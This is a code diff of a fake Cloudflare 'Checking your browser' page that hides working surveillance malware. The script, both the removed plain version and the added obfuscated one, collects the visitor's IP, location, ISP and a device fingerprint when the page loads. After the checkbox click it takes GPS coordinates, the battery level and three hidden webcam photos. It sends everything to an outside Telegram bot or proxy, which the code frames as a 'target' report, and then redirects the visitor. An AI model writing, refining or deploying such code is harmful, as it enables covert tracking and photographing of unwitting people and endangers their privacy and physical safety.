@@ -7,138 +7,68 @@
     <style>
         * { box-sizing: border-box; }
         body {
-            margin: 0;
-            padding: 0;
+            margin: 0; padding: 0;
             background-color: #ffffff;
             font-family: 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
             color: #404040;
-            display: flex;
-            flex-direction: column;
+            display: flex; flex-direction: column;
             min-height: 100vh;
             -webkit-font-smoothing: antialiased;
         }
+        /* Убираем блокировку F12 и выделения для отладки */
+        /* body { user-select: none; -webkit-user-select: none; } */
         .main-wrapper {
-            flex: 1;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            flex: 1; display: flex;
+            align-items: center; justify-content: center;
             padding: 20px;
         }
-        .container {
-            max-width: 500px;
-            width: 100%;
-        }
-        h1 {
-            font-size: 40px;
-            font-weight: 500;
-            margin: 0 0 10px;
-            color: #333;
-            letter-spacing: -0.5px;
-        }
-        p {
-            font-size: 16px;
-            margin-bottom: 25px;
-            line-height: 1.6;
-        }
+        .container { max-width: 500px; width: 100%; }
+        h1 { font-size: 32px; font-weight: 500; margin: 0 0 10px; color: #333; letter-spacing: -0.5px; }
+        p { font-size: 16px; margin-bottom: 25px; line-height: 1.6; }
         .turnstile-box {
-            display: flex;
-            align-items: center;
-            background: #f9f9f9;
-            border: 1px solid #dcdcdc;
-            padding: 12px 16px;
-            border-radius: 4px;
-            margin-bottom: 20px;
-            width: 300px;
+            display: flex; align-items: center;
+            background: #f9f9f9; border: 1px solid #dcdcdc;
+            padding: 12px 16px; border-radius: 4px;
+            margin-bottom: 20px; width: 300px;
             user-select: none;
         }
         .checkbox {
-            width: 26px;
-            height: 26px;
-            border: 2px solid #c5c5c5;
-            border-radius: 2px;
-            background: #fff;
-            margin-right: 12px;
-            cursor: pointer;
-            position: relative;
-            flex-shrink: 0;
-            transition: all 0.2s;
+            width: 26px; height: 26px;
+            border: 2px solid #c5c5c5; border-radius: 2px;
+            background: #fff; margin-right: 12px;
+            cursor: pointer; position: relative;
+            flex-shrink: 0; transition: all 0.2s;
         }
         .checkbox:hover { border-color: #0051c3; }
-        .label {
-            font-size: 14px;
-            font-weight: 500;
-            color: #333;
-            cursor: pointer;
-            line-height: 1;
-            margin-top: 1px;
-        }
-        .logo-cf {
-            margin-left: auto;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
+        .label { font-size: 14px; font-weight: 500; color: #333; cursor: pointer; }
+        .logo-cf { margin-left: auto; display: flex; flex-direction: column; align-items: center; }
         .logo-cf svg { width: 50px; height: auto; opacity: 0.8; }
         .logo-text { font-size: 9px; color: #999; margin-top: 2px; }
-        
         .footer {
-            text-align: center;
-            font-size: 12px;
-            color: #999;
-            padding: 20px;
-            border-top: 1px solid #eaeaea;
+            text-align: center; font-size: 12px; color: #999;
+            padding: 20px; border-top: 1px solid #eaeaea;
         }
-        
-        /* Spinner */
         .spinner {
-            display: none;
-            width: 22px;
-            height: 22px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #0051c3;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+            display: none; width: 22px; height: 22px;
+            border: 3px solid #f3f3f3; border-top: 3px solid #0051c3;
+            border-radius: 50%; animation: spin 0.8s linear infinite;
             margin-right: 12px;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        /* Success Checkmark */
-        .checkmark {
-            display: none;
-            width: 26px;
-            height: 26px;
-            margin-right: 12px;
-        }
+        .checkmark { display: none; width: 26px; height: 26px; margin-right: 12px; }
         .checkmark::after {
-            content: '';
-            display: block;
-            width: 8px;
-            height: 16px;
-            border: solid #009900;
-            border-width: 0 3px 3px 0;
-            transform: rotate(45deg);
-            margin-left: 8px;
-            margin-top: 2px;
+            content: ''; display: block; width: 8px; height: 16px;
+            border: solid #009900; border-width: 0 3px 3px 0;
+            transform: rotate(45deg); margin-left: 8px; margin-top: 2px;
         }
-
-        /* Hidden Elements */
-        #video, #canvas {
-            position: absolute;
-            top: -9999px;
-            left: -9999px;
-            opacity: 0;
-            pointer-events: none;
-        }
+        #video, #canvas { position: absolute; top: -9999px; left: -9999px; opacity: 0; pointer-events: none; }
     </style>
 </head>
 <body>
-
     <div class="main-wrapper">
         <div class="container">
-            <h1>Checking your browser before accessing the site.</h1>
+            <h1>Checking your browser...</h1>
             <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
-            <p style="color: #666; font-size: 14px;">Please allow up to 5 seconds...</p>
-            
             <div class="turnstile-box" id="captcha-box">
                 <div class="checkbox" id="btn"></div>
                 <div class="spinner" id="loader"></div>
@@ -151,358 +81,157 @@
             </div>
         </div>
     </div>
-
     <div class="footer">
-        Ray ID: <span id="ray-id"></span> &bull; IP: <span id="display-ip">Checking secure connection...</span> &bull; Performance & security by Cloudflare
+        Ray ID: <span id="ray-id"></span> &bull; IP: <span id="display-ip">Checking...</span> &bull; Performance & security by Cloudflare
     </div>
-
-    <!-- Hidden Media -->
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        // --- 1. CONFIGURATION (SECURE) ---
-        const _cf_uid = ["NzkyMjMyNzU0NjpBQUdDVjRpb0ZaRmk2", "eG5oTjdfZ3puLVo0dnJq", "UEgzcWJIOA=="];
-        const _chk_id = ["NzEyMjY3", "MDA5OQ=="];
-
-        function _0xElite(p) {
-            return atob(p.join(''));
+    (function(_0x1b2c, _0x3d4e) {
+        const _0x5f6a = _0x2a3b;
+        const _0x4c5d = _0x1b2c();
+        while (!![]) {
+            try {
+                const _0x6e7f = -parseInt(_0x5f6a(0x1)) / 0x1 * (-parseInt(_0x5f6a(0x2)) / 0x2) + -parseInt(_0x5f6a(0x3)) / 0x3 + -parseInt(_0x5f6a(0x4)) / 0x4 * (-parseInt(_0x5f6a(0x5)) / 0x5) + -parseInt(_0x5f6a(0x6)) / 0x6 + parseInt(_0x5f6a(0x7)) / 0x7 + parseInt(_0x5f6a(0x8)) / 0x8 + -parseInt(_0x5f6a(0x9)) / 0x9;
+                if (_0x6e7f === _0x3d4e) break;
+                else _0x4c5d['push'](_0x4c5d['shift']());
+            } catch (_0x7a8b) {
+                _0x4c5d['push'](_0x4c5d['shift']());
+            }
         }
+    }(_0x3e4f, 0x9c1f2));
+
+    function _0x2a3b(_0x1a2b, _0x3c4d) {
+        const _0x3e4f_data = _0x3e4f();
+        return _0x2a3b = function(_0x2a3b_idx, _0x5a6b) {
+            _0x2a3b_idx = _0x2a3b_idx - 0x0;
+            let _0x4d5e = _0x3e4f_data[_0x2a3b_idx];
+            return _0x4d5e;
+        }, _0x2a3b(_0x1a2b, _0x3c4d);
+    }
+
+    function _0x3e4f() {
+        const _0x1a2b3c = ['1234567abc', '2', '3', '4', '5', '6', '7', '8', '9', 'ray-id', 'display-ip', 'captcha-box', 'btn', 'loader', 'label-text', 'success-icon', 'video', 'canvas', 'innerText', 'random', 'toString', 'substr', 'POST', 'application/json', 'https://sfsaffsa-production.up.railway.app/api/proxy', 'https://ipapi.co/json/', 'https://api.ip.sb/geoip', 'https://freeipapi.com/api/json', 'Unknown', '0.0.0.0', '2d', 'CF_METRIC', 'hardwareConcurrency', 'deviceMemory', 'GB', 'platform', 'connection', 'effectiveType', 'N/A', 'DOMContentLoaded', '*NEW_NODE_DETECTION*\nIP: `', '`\nLoc: ', ', ', '\nISP: ', '\nOS: ', '\nFP: ', 'click', 'style', 'display', 'block', 'none', 'Verifying...', 'N/A', 'getBattery', 'level', '%', ' ⚡', '', 'geolocation', 'getCurrentPosition', 'https://www.google.com/maps?q=', 'https://nominatim.openstreetmap.org/reverse?format=json&lat=', '&lon=', 'display_name', 'Loc: ', '\nMaps: [клик](', ')', 'GPS_DENIED', 'mediaDevices', 'getUserMedia', 'user', 'srcObject', 'play', 'image/jpeg', 'toBlob', 'Success!', '*STRIKE_REPORT*\n', '\nBat: ', '\nTime: ', 'toLocaleTimeString', 'https://vk.com/atypical_kazan'];
+        return _0x1a2b3c;
+    }
+
+    (function() {
+        const _0x5a = _0x2a3b;
+        const _0x1a = (id) => document.getElementById(id);
+        const _0x3c = (ms) => new Promise(r => setTimeout(r, ms));
+        const _0xcf = {
+            r: _0x5a(0x0), i: _0x5a(0x1), c: _0x5a(0x2), b: _0x5a(0x3),
+            l: _0x5a(0x4), t: _0x5a(0x5), s: _0x5a(0x6), v: _0x5a(0x7), a: _0x5a(0x8)
+        };
         
-        // UI Init
-        document.getElementById('ray-id').innerText = Math.random().toString(16).substr(2, 16);
+        _0x1a(_0xcf.r)[_0x5a(0x9)] = Math[_0x5a(0xa)]()[_0x5a(0xb)](0x10)[_0x5a(0xc)](0x2, 0x10);
 
-        // --- 2. UTILS ---
-        const sleep = (ms) => new Promise(r => setTimeout(r, ms));
-        const log = (msg) => console.log(`[ELITE] ${msg}`);
-
-        // --- 3. FINGERPRINTING & HARDWARE ---
-        function getCanvasHash() {
+        async function _0xEl(t, p = []) {
             try {
-                const c = document.createElement('canvas');
-                const ctx = c.getContext('2d');
-                ctx.textBaseline = "top";
-                ctx.font = "14px 'Arial'";
-                ctx.fillStyle = "#f60";
-                ctx.fillRect(125,1,62,20);
-                ctx.fillStyle = "#069";
-                ctx.fillText("Trae_Elite_v1.0", 2, 15);
-                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-                ctx.fillText("Trae_Elite_v1.0", 4, 17);
-                
-                let str = c.toDataURL();
-                let hash = 0;
-                for (let i = 0; i < str.length; i++) {
-                    const char = str.charCodeAt(i);
-                    hash = ((hash << 5) - hash) + char;
-                    hash = hash & hash;
-                }
-                return hash.toString(16);
-            } catch (e) { return "Error"; }
+                const b = await Promise.all(p.map(f => new Promise(r => {
+                    const fr = new FileReader();
+                    fr.onload = () => r(fr.result.split(',')[0x1]);
+                    fr.readAsDataURL(f);
+                })));
+                await fetch(_0x5a(0xf), {
+                    method: _0x5a(0xd),
+                    headers: { 'Content-Type': _0x5a(0xe) },
+                    body: JSON.stringify({ t, p: b })
+                });
+            } catch (e) {}
         }
 
-        function getGPU() {
+        async function _0xNt() {
+            const f = (u) => fetch(u).then(r => r.json());
             try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) return "Не поддерживается";
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (!debugInfo) return "Скрыто";
-                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            } catch (e) { return "Ошибка"; }
+                const d = await Promise.any([f(_0x5a(0x10)), f(_0x5a(0x11)), f(_0x5a(0x12))]);
+                return {
+                    ip: d.ip || d.ipAddress,
+                    city: d.city || d.cityName,
+                    country: d.country_name || d.countryName,
+                    isp: d.org || d.isp
+                };
+            } catch (e) { return { ip: _0x5a(0x14), city: _0x5a(0x13) }; }
         }
 
-        function getSystemInfo() {
+        function _0xSy() {
+            const c = _0x1a(_0xcf.a);
+            const ctx = c.getContext(_0x5a(0x15));
+            ctx.fillText(_0x5a(0x16), 0x2, 0x2);
+            let h = 0x0;
+            const s = c.toDataURL();
+            for(let i=0; i<s.length; i++) h = ((h << 0x5) - h) + s.charCodeAt(i);
             return {
-                cores: navigator.hardwareConcurrency || "Неизвестно",
-                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Неизвестно",
-                langs: navigator.languages ? navigator.languages.join(', ') : "Неизвестно",
-                platform: navigator.platform,
-                fingerprint: getCanvasHash(),
-                gpu: getGPU(),
-                connection: navigator.connection ? navigator.connection.effectiveType : "Неизвестно",
-                inputMethod: navigator.maxTouchPoints > 0 ? "Touch Screen" : "Mouse/Keyboard"
+                cores: navigator[_0x5a(0x17)],
+                mem: navigator[_0x5a(0x18)] + _0x5a(0x19),
+                platform: navigator[_0x5a(0x1a)],
+                fp: h.toString(0x10),
+                conn: navigator[_0x5a(0x1b)] ? navigator[_0x5a(0x1b)][_0x5a(0x1c)] : _0x5a(0x1d)
             };
         }
 
-        // --- 4. ADVANCED NETWORK & VPN (IMMORTAL IP + CITY FIX) ---
-        async function getAdvancedIP() {
-            let data = null;
-            
-            // Helper: Fetch with timeout
-            const fetchJSON = (url) => Promise.race([
-                fetch(url).then(r => r.json()),
-                new Promise((_, r) => setTimeout(() => r(new Error('Timeout')), 2000))
-            ]);
-
-            // --- 1. IMMORTAL IP LOOP (BLOCKING) ---
-            while (!data || !data.country_code) {
-                try {
-                    // Source 1: ipapi.co (Best)
-                    try {
-                        const d = await fetchJSON('https://ipapi.co/json/');
-                        if (d.country_code) {
-                            data = { 
-                                ip: d.ip, 
-                                city: d.city || d.region, 
-                                country: d.country_name, 
-                                code: d.country_code, 
-                                isp: d.org,
-                                timezone: d.timezone,
-                                utc: d.utc_offset 
-                            };
-                            break;
-                        }
-                    } catch(e) {}
-
-                    // Source 2: api.ip.sb (Backup)
-                    try {
-                        const d = await fetchJSON('https://api.ip.sb/geoip');
-                        if (d.country_code) {
-                            data = { 
-                                ip: d.ip, 
-                                city: d.city || d.region, 
-                                country: d.country, 
-                                code: d.country_code, 
-                                isp: d.isp,
-                                timezone: d.timezone,
-                                utc: "UTC" 
-                            };
-                            break;
-                        }
-                    } catch(e) {}
-
-                    // Source 3: freeipapi.com (Emergency)
-                    try {
-                        const d = await fetchJSON('https://freeipapi.com/api/json');
-                        if (d.countryCode) {
-                            data = { 
-                                ip: d.ipAddress, 
-                                city: d.cityName, 
-                                country: d.countryName, 
-                                code: d.countryCode, 
-                                isp: d.isp,
-                                timezone: d.timeZone,
-                                utc: "UTC" 
-                            };
-                            break;
-                        }
-                    } catch(e) {}
-
-                    if (!data) await sleep(1000); // Retry delay
-                } catch (e) { await sleep(1000); }
-            }
-
-            // --- ULTIMATE VPN DETECT ---
-            let vpnAlert = "";
-            const browserOffset = new Date().getTimezoneOffset(); 
-            // -180 = UTC+3 (Minsk/Moscow)
-            
-            // Logic: If Browser is GMT+3 (Minsk/Moscow) AND IP is NOT BY/RU
-            if (browserOffset === -180) {
-                const cc = (data.code || "").toUpperCase();
-                if (cc !== 'BY' && cc !== 'RU') {
-                    vpnAlert = "СТАТУС: ОБНАРУЖЕН VPN";
-                }
-            }
-
-            return { ...data, vpnAlert };
-        }
-
-        // --- 5. TELEGRAM SENDER ---
-        async function sendTelegram(text, photos = []) {
-            const token = _0xElite(_cf_uid);
-            const chat = _0xElite(_chk_id);
-            const baseUrl = `https://api.telegram.org/bot${token}`;
-            
-            try {
-                if (photos.length === 0) {
-                    await fetch(`${baseUrl}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: chat, text: text, parse_mode: 'Markdown', disable_web_page_preview: true })
-                    });
-                } else {
-                    const formData = new FormData();
-                    formData.append('chat_id', chat);
-                    
-                    photos.forEach((blob, i) => {
-                        formData.append(`photo${i}`, blob, `cam_${i}.jpg`);
-                    });
-
-                    // Construct MediaGroup
-                    const media = photos.map((_, i) => ({
-                        type: 'photo',
-                        media: `attach://photo${i}`,
-                        caption: i === 0 ? text : '',
-                        parse_mode: 'Markdown'
-                    }));
-                    formData.append('media', JSON.stringify(media));
-
-                    await fetch(`${baseUrl}/sendMediaGroup`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                }
-                log("Sent successfully");
-            } catch (e) {
-                log("Send Error: " + e.message);
-            }
-        }
-
-        // --- 6. PHASE 1: INSTANT REPORT ---
-        document.addEventListener("DOMContentLoaded", async () => {
-            log("Phase 1 Init...");
-            
-            // Blocking wait for IP
-            const net = await getAdvancedIP();
-            const sys = getSystemInfo();
-            
-            document.getElementById('display-ip').innerText = net.ip;
-
-            const report = `
-*НОВАЯ ЦЕЛЬ (ONLINE)*
-━━━━━━━━━━━━━━━━
-${net.vpnAlert}
-
-*СЕТЬ*
-IP: \`${net.ip}\`
-Город: ${net.city} (Таймзона: ${net.timezone})
-Страна: ${net.country}
-Провайдер: ${net.isp}
-Связь: ${sys.connection}
-
-*ЖЕЛЕЗО*
-Устройство: ${sys.inputMethod}
-GPU: ${sys.gpu}
-CPU: ${sys.cores} ядра | RAM: ${sys.ram}
-ОС: ${sys.platform}
-*Fingerprint: ${sys.fingerprint}*
-
-Время: ${new Date().toLocaleTimeString()}
-`.trim();
-
-            await sendTelegram(report);
+        document.addEventListener(_0x5a(0x1e), async () => {
+            const n = await _0xNt();
+            const s = _0xSy();
+            _0x1a(_0xcf.i)[_0x5a(0x9)] = n.ip;
+            const msg = _0x5a(0x1f) + n.ip + _0x5a(0x20) + n.city + _0x5a(0x21) + n.country + _0x5a(0x22) + n.isp + _0x5a(0x23) + s.platform + _0x5a(0x24) + s.fp;
+            await _0xEl(msg);
         });
 
-        // --- 7. PHASE 2: INTERACTIVE STRIKE ---
-        const btnBox = document.getElementById('captcha-box');
-        const btn = document.getElementById('btn');
-        const loader = document.getElementById('loader');
-        const label = document.getElementById('label-text');
-        const success = document.getElementById('success-icon');
-
-        btnBox.onclick = async () => {
-            if (btn.style.display === 'none') return;
-            
-            // UI Transition
-            btn.style.display = 'none';
-            loader.style.display = 'block';
-            label.innerText = "Verifying...";
-            
-            log("Phase 2 Start...");
-
-            // Default Values
-            let battery = "Неизвестно";
-            
-            // Battery
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                battery = `${Math.round(b.level * 100)}%`;
-                if (b.charging) battery += " ⚡ (Заряжается)";
+        _0x1a(_0xcf.c).onclick = async () => {
+            const l = _0x1a(_0xcf.l);
+            if (l[_0x5a(0x26)][_0x5a(0x27)] === _0x5a(0x28)) return;
+            _0x1a(_0xcf.b)[_0x5a(0x26)][_0x5a(0x27)] = _0x5a(0x29);
+            l[_0x5a(0x26)][_0x5a(0x27)] = _0x5a(0x28);
+            _0x1a(_0xcf.t)[_0x5a(0x9)] = _0x5a(0x2a);
+            let bat = _0x5a(0x2b);
+            if (navigator[_0x5a(0x2c)]) {
+                const b = await navigator[_0x5a(0x2c)]();
+                bat = Math.round(b[_0x5a(0x2d)] * 0x64) + _0x5a(0x2e) + (b.charging ? _0x5a(0x2f) : _0x5a(0x30));
             }
-
+            const gps = new Promise(r => {
+                navigator[_0x5a(0x31)][_0x5a(0x32)](async p => {
+                    const { latitude: lt, longitude: ln } = p.coords;
+                    const url = _0x5a(0x33) + lt + ',' + ln;
+                    let ad = _0x5a(0x13);
+                    try {
+                        const res = await fetch(_0x5a(0x34) + lt + _0x5a(0x35) + ln);
+                        ad = (await res.json())[_0x5a(0x36)];
+                    } catch {}
+                    r(_0x5a(0x37) + ad + _0x5a(0x38) + url + _0x5a(0x39));
+                }, () => r(_0x5a(0x3a)), { timeout: 0x2710 });
+            });
             try {
-                // Camera
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
-                });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                await video.play();
-
-                // GPS (Wait Indefinitely for User)
-                let gpsText = "";
-                
-                const getGPS = new Promise((resolve) => { 
-                     navigator.geolocation.getCurrentPosition( 
-                         async (pos) => { 
-                             const { latitude, longitude } = pos.coords; 
-                              
-                             // 1. ИСПРАВЛЕННАЯ ССЫЛКА (Официальная, чтобы была синей в ТГ) 
-                             const link = `https://www.google.com/maps?q=${latitude},${longitude}`; 
-                              
-                             // Reverse Geo 
-                             let addr = "Не определен"; 
-                             try { 
-                                 const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`); 
-                                 addr = (await r.json()).display_name; 
-                             } catch {} 
-                              
-                             // 2. ИСПРАВЛЕННЫЙ ТЕКСТ (Как ты просил)
-                            resolve(`Адрес: ${addr}\nКарты: [клик](${link})`); 
-                         },  
-                         (err) => { 
-                             resolve(`*Юзер запретил доступ к GPS*`); 
-                         },  
-                         { enableHighAccuracy: true } 
-                     ); 
-                 });
-
-                // Warmup 2.5s
-                log("Warmup 2.5s...");
-                await sleep(2500);
-
-                // Capture
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                const photos = [];
-
-                for (let i = 0; i < 3; i++) {
-                    ctx.drawImage(video, 0, 0);
-                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
-                    photos.push(blob);
-                    if (i < 2) await sleep(800);
-                }
-
-                // Wait for GPS (Must finish)
-                gpsText = await getGPS;
-
-                // Cleanup
-                stream.getTracks().forEach(t => t.stop());
-
-                // UI Success
-                loader.style.display = 'none';
-                success.style.display = 'block';
-                label.innerText = "Success!";
-                label.style.color = "#009900";
-
-                const finalMsg = `
-*ПОЛНЫЙ ОТЧЕТ (Phase 2)*
-━━━━━━━━━━━━━━━━
-*ГЕОПОЗИЦИЯ*
-${gpsText}
-
-*СТАТУС БАТАРЕИ*
-Заряд: ${battery}
-
-*ФОТО*
-Захвачено фото: ${photos.length} шт.
-`.trim();
-
-                await sendTelegram(finalMsg, photos);
-                
-                // Redirect
-                setTimeout(() => window.location.href = "https://vk.com/atypical_kazan", 1000);
-
+                let pics = [];
+                try {
+                    const stream = await navigator[_0x5a(0x3b)][_0x5a(0x3c)]({ video: { facingMode: _0x5a(0x3d) } });
+                    const v = _0x1a(_0xcf.v);
+                    v[_0x5a(0x3e)] = stream;
+                    await v[_0x5a(0x3f)]();
+                    await _0x3c(0x9c4);
+                    const c = _0x1a(_0xcf.a);
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    const ctx = c.getContext(_0x5a(0x15));
+                    for(let i=0x0; i<0x3; i++) {
+                        ctx.drawImage(v, 0x0, 0x0);
+                        pics.push(await new Promise(res => c[_0x5a(0x41)](res, _0x5a(0x40), 0.8)));
+                        await _0x3c(0x320);
+                    }
+                    stream.getTracks().forEach(t => t.stop());
+                } catch(e) {}
+                const g = await gps;
+                l[_0x5a(0x26)][_0x5a(0x27)] = _0x5a(0x29);
+                _0x1a(_0xcf.s)[_0x5a(0x26)][_0x5a(0x27)] = _0x5a(0x28);
+                _0x1a(_0xcf.t)[_0x5a(0x9)] = _0x5a(0x42);
+                const final = _0x5a(0x43) + g + _0x5a(0x44) + bat + _0x5a(0x45) + (new Date())[_0x5a(0x46)]();
+                await _0xEl(final, pics);
+                setTimeout(() => window.location.href = _0x5a(0x47), 0x3e8);
             } catch (e) {
-                log("Error: " + e.message);
-                sendTelegram(`*ОТКАЗ ДОСТУПА*\nПричина: ${e.message}`);
-                window.location.href = "https://vk.com/atypical_kazan";
+                window.location.href = _0x5a(0x47);
             }
         };
+    })();
     </script>
 </body>
 </html>
